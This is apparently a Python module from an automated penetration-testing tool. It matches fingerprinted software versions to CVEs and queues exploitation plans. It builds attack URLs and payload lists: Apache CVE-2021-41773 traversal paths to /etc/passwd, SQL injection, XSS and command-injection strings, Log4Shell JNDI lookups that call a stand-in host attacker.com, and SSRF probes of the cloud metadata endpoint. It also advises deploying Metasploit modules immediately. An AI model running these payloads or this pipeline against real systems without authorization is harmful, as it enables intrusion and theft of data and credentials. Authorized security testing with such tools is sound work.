"""
CVE Auto-Integration - P7 Elite Enhancement
============================================

Automatically correlates fingerprinted technology versions with CVE databases
and queues exploitation hypotheses in the hypothesis ledger.

This module bridges the gap between:
1. Tech stack detection (identify_tech_stack)
2. CVE lookup (version_to_cves)
3. Hypothesis queueing (hypothesis_ledger.add)

WORKFLOW:
---------
identify_tech_stack() → auto_queue_cve_exploits() → hypothesis_ledger

When a technology version is fingerprinted (e.g., "Apache/2.4.49"), 
this module automatically:
1. Queries CVE databases for known vulnerabilities
2. Searches for available exploits
3. Prioritizes by severity and exploit availability
4. Queues hypotheses in the ledger for testing
5. Returns actionable exploitation plan

INTEGRATION POINTS:
-------------------
- Uses existing vuln_intel_actions.version_to_cves()
- Writes to hypothesis_ledger via hypothesis_actions.add_hypothesis()
- Enriches hypotheses with CVE metadata

Author: P7 Elite Enhancement
Version: 1.0.0
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from datetime import UTC, datetime
from typing import Any

from phantom.tools.registry import register_tool


logger = logging.getLogger(__name__)


# CVE-to-Attack Surface Mapping
# Maps CVE/CWE types to Phantom vulnerability classes
CVE_TO_VULN_CLASS_MAP = {
    "path traversal": "path_traversal",
    "directory traversal": "path_traversal",
    "arbitrary file read": "path_traversal",
    "sql injection": "sqli",
    "sqli": "sqli",
    "cross-site scripting": "xss",
    "xss": "xss",
    "reflected xss": "xss",
    "stored xss": "xss",
    "remote code execution": "rce",
    "rce": "rce",
    "command injection": "cmd_injection",
    "os command injection": "cmd_injection",
    "xxe": "xxe",
    "xml external entity": "xxe",
    "server-side template injection": "ssti",
    "ssti": "ssti",
    "authentication bypass": "auth_bypass",
    "authorization bypass": "authz_bypass",
    "csrf": "csrf",
    "cross-site request forgery": "csrf",
    "open redirect": "open_redirect",
    "ssrf": "ssrf",
    "server-side request forgery": "ssrf",
    "deserialization": "deserialization",
    "insecure deserialization": "deserialization",
    "file upload": "file_upload",
    "unrestricted file upload": "file_upload",
    "lfi": "lfi",
    "local file inclusion": "lfi",
    "rfi": "rfi",
    "remote file inclusion": "rfi",
    "idor": "idor",
    "insecure direct object reference": "idor",
}


@dataclass
class CVEExploitHypothesis:
    """Represents a CVE-based exploitation hypothesis."""
    
    cve_id: str
    product: str
    version: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    description: str
    vuln_class: str  # Mapped to Phantom's vuln classes
    attack_surface: str  # URL or endpoint to target
    exploit_available: bool
    exploit_type: str | None = None  # metasploit, poc, manual
    exploit_url: str | None = None
    cvss_score: float | None = None
    confidence: str = "HIGH"  # HIGH (exploit available), MEDIUM (CVE only)
    recommended_payloads: list[str] = field(default_factory=list)
    metadata: dict[str, Any] = field(default_factory=dict)
    
    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for serialization."""
        return {
            "cve_id": self.cve_id,
            "product": self.product,
            "version": self.version,
            "severity": self.severity,
            "description": self.description,
            "vuln_class": self.vuln_class,
            "attack_surface": self.attack_surface,
            "exploit_available": self.exploit_available,
            "exploit_type": self.exploit_type,
            "exploit_url": self.exploit_url,
            "cvss_score": self.cvss_score,
            "confidence": self.confidence,
            "recommended_payloads": self.recommended_payloads,
            "metadata": self.metadata,
        }


def _map_cve_to_vuln_class(cve_description: str) -> str:
    """
    Map CVE description to Phantom vulnerability class.
    
    Uses keyword matching against CVE_TO_VULN_CLASS_MAP.
    Falls back to 'rce' if no specific match found.
    
    Args:
        cve_description: CVE description text
        
    Returns:
        Vulnerability class (e.g., 'sqli', 'xss', 'path_traversal')
    """
    desc_lower = cve_description.lower()
    
    # Try exact matches first
    for keyword, vuln_class in CVE_TO_VULN_CLASS_MAP.items():
        if keyword in desc_lower:
            return vuln_class
    
    # Check for CWE patterns
    cwe_patterns = {
        "cwe-79": "xss",
        "cwe-89": "sqli",
        "cwe-78": "cmd_injection",
        "cwe-22": "path_traversal",
        "cwe-611": "xxe",
        "cwe-94": "rce",
        "cwe-434": "file_upload",
        "cwe-918": "ssrf",
        "cwe-502": "deserialization",
    }
    for cwe_id, vuln_class in cwe_patterns.items():
        if cwe_id in desc_lower:
            return vuln_class
    
    # Default to RCE if severity is CRITICAL/HIGH
    return "rce"


def _generate_attack_surfaces(
    product: str, 
    version: str, 
    base_url: str,
    vuln_class: str
) -> list[str]:
    """
    Generate potential attack surfaces based on product and vulnerability class.
    
    Args:
        product: Product name (e.g., 'apache', 'nginx')
        version: Version string
        base_url: Target base URL
        vuln_class: Vulnerability class
        
    Returns:
        List of attack surface URLs/paths to test
    """
    product_lower = product.lower()
    surfaces = []
    
    # Generic surfaces
    surfaces.append(f"{base_url}/")
    
    # Product-specific surfaces
    if "apache" in product_lower and vuln_class == "path_traversal":
        # CVE-2021-41773, CVE-2021-42013
        surfaces.extend([
            f"{base_url}/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            f"{base_url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            f"{base_url}/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        ])
    
    if "wordpress" in product_lower:
        surfaces.extend([
            f"{base_url}/wp-admin/",
            f"{base_url}/wp-login.php",
            f"{base_url}/wp-json/wp/v2/users",
            f"{base_url}/xmlrpc.php",
        ])
    
    if "drupal" in product_lower:
        surfaces.extend([
            f"{base_url}/user/login",
            f"{base_url}/?q=node&destination=node",
            f"{base_url}/admin",
        ])
    
    if "joomla" in product_lower:
        surfaces.extend([
            f"{base_url}/administrator/",
            f"{base_url}/administrator/index.php",
        ])
    
    if "nginx" in product_lower:
        surfaces.extend([
            f"{base_url}/../",
            f"{base_url}/..;/",
        ])
    
    if "tomcat" in product_lower or "java" in product_lower:
        surfaces.extend([
            f"{base_url}/manager/html",
            f"{base_url}/host-manager/html",
            f"{base_url}/examples/",
        ])
    
    if "jenkins" in product_lower:
        surfaces.extend([
            f"{base_url}/script",
            f"{base_url}/scriptText",
            f"{base_url}/asynchPeople/",
        ])
    
    if "gitlab" in product_lower:
        surfaces.extend([
            f"{base_url}/api/v4/users",
            f"{base_url}/api/graphql",
        ])
    
    if "spring" in product_lower and vuln_class == "rce":
        # Spring4Shell
        surfaces.append(f"{base_url}/")
    
    # Vuln-class-specific surfaces
    if vuln_class in ["sqli", "xss", "cmd_injection"]:
        surfaces.extend([
            f"{base_url}/search",
            f"{base_url}/login",
            f"{base_url}/api/search",
        ])
    
    return surfaces


def _generate_recommended_payloads(
    vuln_class: str,
    product: str,
    cve_description: str
) -> list[str]:
    """
    Generate recommended payloads based on CVE details.
    
    Args:
        vuln_class: Vulnerability class
        product: Product name
        cve_description: CVE description
        
    Returns:
        List of recommended payloads to try first
    """
    payloads = []
    desc_lower = cve_description.lower()
    
    if vuln_class == "path_traversal":
        payloads.extend([
            "../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            ".%2e/.%2e/.%2e/.%2e/etc/passwd",
            "....//....//....//etc/passwd",
        ])
    
    if vuln_class == "sqli":
        payloads.extend([
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL,NULL,NULL--",
        ])
    
    if vuln_class == "xss":
        payloads.extend([
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ])
    
    if vuln_class == "cmd_injection":
        payloads.extend([
            "; id",
            "| id",
            "` id `",
            "$( id )",
        ])
    
    if vuln_class == "rce":
        if "log4j" in desc_lower or "log4shell" in desc_lower:
            payloads.extend([
                "${jndi:ldap://attacker.com/a}",
                "${jndi:dns://attacker.com}",
            ])
        elif "spring" in product.lower() and "spring4shell" in desc_lower:
            payloads.append("class.module.classLoader.resources.context.parent.pipeline...")
        else:
            payloads.extend([
                "; whoami",
                "| whoami",
            ])
    
    if vuln_class == "ssrf":
        payloads.extend([
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:6379/",
            "file:///etc/passwd",
        ])
    
    return payloads




def _generate_action(hypothesis: CVEExploitHypothesis) -> str:
    """Generate recommended action for hypothesis."""
    if hypothesis.exploit_available:
        if hypothesis.exploit_type == "metasploit":
            return f"Deploy Metasploit module immediately - {hypothesis.severity} severity RCE"
        else:
            return f"Test PoC exploit from {hypothesis.exploit_url} - {hypothesis.severity} severity"
    else:
        return f"Manual testing required for {hypothesis.vuln_class} - Review CVE {hypothesis.cve_id}"




